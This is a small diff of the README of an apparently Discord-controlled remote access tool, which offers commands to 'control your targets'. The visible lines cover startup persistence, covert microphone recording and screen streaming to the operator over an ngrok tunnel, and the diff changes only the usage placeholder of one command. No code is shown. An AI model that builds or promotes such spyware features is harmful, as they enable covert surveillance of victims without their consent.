@@ -14,7 +14,7 @@ PYcord featuring multiple cool commands you can use to control your targets, inc
 .addstartup to add file to startup
 .recordmic <seconds> to record mic for
 .stoprecord to stop mic recording early
-.screenshare <url-ngrok-http> to screen share from client to you through ngrok tunnel
+.screenshare <url> to screen share from client to you through ngrok tunnel
 .stopsharing to stop screen sharing
 
 .hello to make sure if bot is running
